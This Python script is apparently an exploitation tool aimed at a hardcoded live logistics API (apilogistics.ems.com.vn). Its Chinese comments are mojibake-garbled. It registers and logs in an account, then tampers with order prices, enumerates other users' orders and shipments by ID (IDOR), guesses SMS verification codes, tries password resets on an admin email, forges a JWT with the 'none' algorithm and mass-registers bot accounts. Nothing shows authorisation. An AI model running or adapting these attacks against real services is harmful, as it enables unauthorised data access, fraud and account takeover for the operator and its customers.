#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EMS API æ·±åº¦åˆ©ç”¨å·¥å…·
é’ˆå¯¹å·²å‘ç°æ¼æ´çš„æ·±å…¥æµ‹è¯•å’Œåˆ©ç”¨
"""

import requests
import json
import random
import string
import time
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EMSDeepExploit:
    """EMS API æ·±åº¦åˆ©ç”¨"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.api_base = f"{self.base_url}/api"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        
        self.test_account = None
        self.access_token = None
        self.results = []
    
    def log(self, level: str, message: str, data: dict = None):
        """è®°å½•ç»“æœ"""
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'level': level,
            'message': message,
            'data': data
        }
        self.results.append(entry)
        
        emoji = {'SUCCESS': 'âœ…', 'INFO': 'â„¹ï¸', 'WARNING': 'âš ï¸', 'ERROR': 'âŒ', 'VULN': 'ğŸ”´'}
        print(f"  {emoji.get(level, 'â€¢')} {message}")
        if data:
            print(f"     æ•°æ®: {json.dumps(data, ensure_ascii=False)[:150]}")
    
    def register_test_account(self):
        """æ³¨å†Œæµ‹è¯•è´¦å·"""
        print("\n" + "="*60)
        print("[1] æ³¨å†Œæµ‹è¯•è´¦å·")
        print("="*60)
        
        # ç”Ÿæˆéšæœºè´¦å·
        username = f"test_{''.join(random.choices(string.ascii_lowercase, k=8))}"
        password = f"Test{''.join(random.choices(string.digits, k=4))}!"
        email = f"{username}@test.local"
        
        data = {
            'username': username,
            'password': password,
            'email': email,
            'phone': f"0{''.join(random.choices(string.digits, k=9))}"
        }
        
        url = f"{self.api_base}/customer/register"
        
        try:
            resp = self.session.post(url, json=data, timeout=10)
            
            if resp.status_code in [200, 201]:
                self.log('SUCCESS', 'è´¦å·æ³¨å†ŒæˆåŠŸ', {
                    'username': username,
                    'password': password,
                    'email': email,
                    'response': resp.json()
                })
                
                self.test_account = {
                    'username': username,
                    'password': password,
                    'email': email
                }
                
                return True
            else:
                self.log('ERROR', f'æ³¨å†Œå¤±è´¥: {resp.status_code}', {'response': resp.text[:200]})
                return False
                
        except Exception as e:
            self.log('ERROR', f'æ³¨å†Œå¼‚å¸¸: {str(e)}')
            return False
    
    def login_test_account(self):
        """ç™»å½•æµ‹è¯•è´¦å·"""
        print("\n" + "="*60)
        print("[2] ç™»å½•æµ‹è¯•è´¦å·")
        print("="*60)
        
        if not self.test_account:
            self.log('ERROR', 'æ²¡æœ‰å¯ç”¨çš„æµ‹è¯•è´¦å·')
            return False
        
        data = {
            'username': self.test_account['username'],
            'password': self.test_account['password']
        }
        
        url = f"{self.api_base}/customer/login"
        
        try:
            resp = self.session.post(url, json=data, timeout=10)
            
            if resp.status_code == 200:
                resp_data = resp.json()
                self.log('SUCCESS', 'ç™»å½•æˆåŠŸ', resp_data)
                
                # æå– token
                for key in ['token', 'access_token', 'access', 'jwt', 'accessToken']:
                    if key in resp_data:
                        self.access_token = resp_data[key]
                        self.log('SUCCESS', f'è·å–åˆ° Token: {key}', {
                            'token_preview': str(self.access_token)[:50] + '...'
                        })
                        
                        # è®¾ç½® Authorization header
                        self.session.headers['Authorization'] = f'Bearer {self.access_token}'
                        return True
                
                self.log('WARNING', 'ç™»å½•æˆåŠŸä½†æœªæ‰¾åˆ° token')
                return True
            else:
                self.log('ERROR', f'ç™»å½•å¤±è´¥: {resp.status_code}', {'response': resp.text[:200]})
                return False
                
        except Exception as e:
            self.log('ERROR', f'ç™»å½•å¼‚å¸¸: {str(e)}')
            return False
    
    def test_authenticated_endpoints(self):
        """æµ‹è¯•å·²è®¤è¯ç«¯ç‚¹"""
        print("\n" + "="*60)
        print("[3] æµ‹è¯•å·²è®¤è¯ç«¯ç‚¹è®¿é—®")
        print("="*60)
        
        endpoints = [
            ('GET', '/customer/info'),
            ('GET', '/customer/order/list'),
            ('GET', '/notification/list'),
            ('GET', '/notification/badge'),
        ]
        
        for method, endpoint in endpoints:
            url = f"{self.api_base}{endpoint}"
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, timeout=10)
                else:
                    resp = self.session.post(url, json={}, timeout=10)
                
                if resp.status_code == 200:
                    self.log('SUCCESS', f'{method} {endpoint} - è®¿é—®æˆåŠŸ', {
                        'status': resp.status_code,
                        'data': resp.json()
                    })
                else:
                    self.log('INFO', f'{method} {endpoint} - çŠ¶æ€: {resp.status_code}')
                    
            except Exception as e:
                self.log('ERROR', f'{method} {endpoint} - å¼‚å¸¸: {str(e)}')
            
            time.sleep(0.2)
    
    def test_order_creation(self):
        """æµ‹è¯•è®¢å•åˆ›å»ºåŠŸèƒ½"""
        print("\n" + "="*60)
        print("[4] æµ‹è¯•è®¢å•åˆ›å»ºå’Œå‚æ•°ç¯¡æ”¹")
        print("="*60)
        
        # æµ‹è¯•ç”¨ä¾‹
        test_cases = [
            {
                'name': 'æ­£å¸¸è®¢å•',
                'data': {
                    'sender_name': 'Test Sender',
                    'sender_phone': '0123456789',
                    'receiver_name': 'Test Receiver',
                    'receiver_phone': '0987654321',
                    'weight': 1.0,
                    'price': 50000
                }
            },
            {
                'name': 'è´Ÿæ•°ä»·æ ¼',
                'data': {
                    'sender_name': 'Test',
                    'sender_phone': '0123456789',
                    'receiver_name': 'Test',
                    'receiver_phone': '0987654321',
                    'weight': 1.0,
                    'price': -1000
                }
            },
            {
                'name': 'é›¶ä»·æ ¼',
                'data': {
                    'sender_name': 'Test',
                    'sender_phone': '0123456789',
                    'receiver_name': 'Test',
                    'receiver_phone': '0987654321',
                    'weight': 1.0,
                    'price': 0
                }
            },
            {
                'name': 'è¶…å¤§æ•°é‡',
                'data': {
                    'sender_name': 'Test',
                    'sender_phone': '0123456789',
                    'receiver_name': 'Test',
                    'receiver_phone': '0987654321',
                    'weight': 999999,
                    'price': 1
                }
            }
        ]
        
        url = f"{self.api_base}/customer/order/create-single"
        
        for test in test_cases:
            try:
                resp = self.session.post(url, json=test['data'], timeout=10)
                
                if resp.status_code in [200, 201]:
                    self.log('VULN', f"è®¢å•åˆ›å»ºæˆåŠŸ: {test['name']}", {
                        'test_case': test['name'],
                        'data': test['data'],
                        'response': resp.json()
                    })
                else:
                    self.log('INFO', f"è®¢å•åˆ›å»ºå¤±è´¥: {test['name']} - {resp.status_code}")
                    
            except Exception as e:
                self.log('ERROR', f"æµ‹è¯•å¼‚å¸¸: {test['name']} - {str(e)}")
            
            time.sleep(0.3)
    
    def test_idor_enumeration(self):
        """æµ‹è¯• IDOR æ•°æ®æšä¸¾"""
        print("\n" + "="*60)
        print("[5] æµ‹è¯• IDOR æ•°æ®æšä¸¾")
        print("="*60)
        
        endpoints = [
            '/order/detail',
            '/shipment/detail',
        ]
        
        found_data = []
        
        for endpoint in endpoints:
            print(f"\n  æµ‹è¯•: {endpoint}")
            
            for obj_id in range(1, 51):  # æµ‹è¯• 1-50
                url = f"{self.api_base}{endpoint}?id={obj_id}"
                
                try:
                    resp = self.session.get(url, timeout=5)
                    
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            found_data.append({
                                'endpoint': endpoint,
                                'id': obj_id,
                                'data': data
                            })
                            self.log('VULN', f'å‘ç°å¯è®¿é—®å¯¹è±¡: {endpoint}?id={obj_id}', data)
                        except:
                            pass
                            
                except Exception:
                    pass
                
                time.sleep(0.1)
        
        if found_data:
            self.log('VULN', f'IDOR æšä¸¾æˆåŠŸ', {
                'total_found': len(found_data),
                'endpoints': list(set([x['endpoint'] for x in found_data]))
            })
    
    def test_password_reset_flow(self):
        """æµ‹è¯•å¯†ç é‡ç½®æµç¨‹"""
        print("\n" + "="*60)
        print("[6] æµ‹è¯•å¯†ç é‡ç½®æµç¨‹")
        print("="*60)
        
        # æµ‹è¯•å‘é€éªŒè¯ç 
        print("  [*] æµ‹è¯•å‘é€éªŒè¯ç ...")
        
        url = f"{self.api_base}/driver/verify/send"
        data = {'phone': '0123456789'}
        
        try:
            resp = self.session.post(url, json=data, timeout=10)
            self.log('INFO', f'å‘é€éªŒè¯ç å“åº”: {resp.status_code}', resp.json() if resp.status_code == 200 else {})
        except Exception as e:
            self.log('ERROR', f'å‘é€éªŒè¯ç å¼‚å¸¸: {str(e)}')
        
        # æµ‹è¯•éªŒè¯ç çŒœæµ‹
        print("  [*] æµ‹è¯•éªŒè¯ç çˆ†ç ´...")
        
        url = f"{self.api_base}/driver/verify/check"
        
        # å¸¸è§éªŒè¯ç 
        common_codes = ['123456', '000000', '111111', '123123', '888888', '999999', '111222', '112233']
        
        for code in common_codes:
            data = {
                'phone': '0123456789',
                'verify_code': code
            }
            
            try:
                resp = self.session.post(url, json=data, timeout=5)
                
                if resp.status_code == 200:
                    self.log('VULN', f'éªŒè¯ç çŒœæµ‹æˆåŠŸ: {code}', resp.json())
                    break
                    
            except Exception:
                pass
            
            time.sleep(0.2)
        
        # æµ‹è¯•å¯†ç é‡ç½®
        print("  [*] æµ‹è¯•å¯†ç é‡ç½®...")
        
        url = f"{self.api_base}/driver/reset-password"
        
        test_cases = [
            {'email': 'admin@ems.com.vn'},
            {'phone': '0900000000'},
            {'email': 'test@test.com', 'verify_code': '123456', 'new_password': 'newpass123'},
        ]
        
        for data in test_cases:
            try:
                resp = self.session.post(url, json=data, timeout=10)
                self.log('INFO', f'å¯†ç é‡ç½®æµ‹è¯•', {
                    'data': data,
                    'status': resp.status_code,
                    'response': resp.json() if resp.status_code == 200 else resp.text[:200]
                })
            except Exception as e:
                self.log('ERROR', f'å¯†ç é‡ç½®æµ‹è¯•å¼‚å¸¸: {str(e)}')
            
            time.sleep(0.3)
    
    def test_jwt_vulnerabilities(self):
        """æµ‹è¯• JWT æ¼æ´"""
        print("\n" + "="*60)
        print("[7] æµ‹è¯• JWT Token æ¼æ´")
        print("="*60)
        
        if not self.access_token:
            self.log('WARNING', 'æ²¡æœ‰å¯ç”¨çš„ token')
            return
        
        # åˆ†æ JWT ç»“æ„
        token_parts = str(self.access_token).split('.')
        
        if len(token_parts) == 3:
            import base64
            
            try:
                # è§£ç  header
                header = base64.urlsafe_b64decode(token_parts[0] + '==').decode()
                self.log('INFO', 'JWT Header', {'header': header})
                
                # è§£ç  payload
                payload = base64.urlsafe_b64decode(token_parts[1] + '==').decode()
                self.log('INFO', 'JWT Payload', {'payload': payload})
                
                # æµ‹è¯• None ç®—æ³•
                print("  [*] æµ‹è¯• None ç®—æ³•æ”»å‡»...")
                modified_header = base64.urlsafe_b64encode(
                    json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
                ).decode().rstrip('=')
                
                modified_token = f"{modified_header}.{token_parts[1]}."
                
                # æµ‹è¯•ä¿®æ”¹åçš„ token
                test_headers = {'Authorization': f'Bearer {modified_token}'}
                url = f"{self.api_base}/customer/info"
                
                try:
                    resp = requests.get(url, headers=test_headers, verify=False, timeout=5)
                    if resp.status_code == 200:
                        self.log('VULN', 'JWT None ç®—æ³•æ”»å‡»æˆåŠŸï¼', resp.json())
                except:
                    pass
                
            except Exception as e:
                self.log('ERROR', f'JWT åˆ†æå¼‚å¸¸: {str(e)}')
    
    def test_mass_registration(self):
        """æµ‹è¯•æ‰¹é‡æ³¨å†Œ"""
        print("\n" + "="*60)
        print("[8] æµ‹è¯•æ‰¹é‡æ³¨å†Œæ»¥ç”¨")
        print("="*60)
        
        success_count = 0
        
        for i in range(10):
            username = f"bot_{random.randint(100000, 999999)}"
            data = {
                'username': username,
                'password': 'Bot123456!',
                'email': f'{username}@bot.test',
                'phone': f"09{''.join(random.choices(string.digits, k=8))}"
            }
            
            url = f"{self.api_base}/customer/register"
            
            try:
                resp = self.session.post(url, json=data, timeout=5)
                
                if resp.status_code in [200, 201]:
                    success_count += 1
                    
            except:
                pass
            
            time.sleep(0.1)
        
        if success_count > 5:
            self.log('VULN', 'æ‰¹é‡æ³¨å†ŒæˆåŠŸ', {
                'success_count': success_count,
                'total': 10,
                'description': 'æ— éªŒè¯ç æˆ–é€Ÿç‡é™åˆ¶ï¼Œå¯æ‰¹é‡åˆ›å»ºè™šå‡è´¦å·'
            })
    
    def export_results(self):
        """å¯¼å‡ºç»“æœ"""
        filename = f"ems_deep_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump({
                'test_account': self.test_account,
                'access_token': str(self.access_token)[:50] + '...' if self.access_token else None,
                'results': self.results
            }, f, ensure_ascii=False, indent=2)
        
        print(f"\n[*] ç»“æœå·²ä¿å­˜: {filename}")
        return filename
    
    def run(self):
        """è¿è¡Œå®Œæ•´æµ‹è¯•"""
        print("\n" + "#"*70)
        print("# EMS API æ·±åº¦åˆ©ç”¨æµ‹è¯•")
        print("#"*70)
        
        try:
            # 1. æ³¨å†Œæµ‹è¯•è´¦å·
            if self.register_test_account():
                time.sleep(1)
                
                # 2. ç™»å½•
                if self.login_test_account():
                    time.sleep(1)
                    
                    # 3. æµ‹è¯•å·²è®¤è¯ç«¯ç‚¹
                    self.test_authenticated_endpoints()
                    time.sleep(1)
                    
                    # 4. æµ‹è¯•è®¢å•åˆ›å»º
                    self.test_order_creation()
                    time.sleep(1)
                    
                    # 5. æµ‹è¯• IDOR
                    self.test_idor_enumeration()
                    time.sleep(1)
                    
                    # 7. JWT æµ‹è¯•
                    self.test_jwt_vulnerabilities()
                    time.sleep(1)
            
            # 6. å¯†ç é‡ç½®æµç¨‹
            self.test_password_reset_flow()
            time.sleep(1)
            
            # 8. æ‰¹é‡æ³¨å†Œ
            self.test_mass_registration()
            
            # å¯¼å‡ºç»“æœ
            self.export_results()
            
            print("\n" + "#"*70)
            print("# æ·±åº¦æµ‹è¯•å®Œæˆï¼")
            print("#"*70)
            
        except KeyboardInterrupt:
            print("\n[!] æµ‹è¯•è¢«ä¸­æ–­")
            self.export_results()
        except Exception as e:
            print(f"\n[!] æµ‹è¯•å¼‚å¸¸: {str(e)}")
            import traceback
            traceback.print_exc()
            self.export_results()


def main():
    target = "https://apilogistics.ems.com.vn:8080"
    
    print("="*70)
    print("EMS API æ·±åº¦åˆ©ç”¨å·¥å…·")
    print("="*70)
    
    exploit = EMSDeepExploit(target)
    exploit.run()


if __name__ == "__main__":
    main()
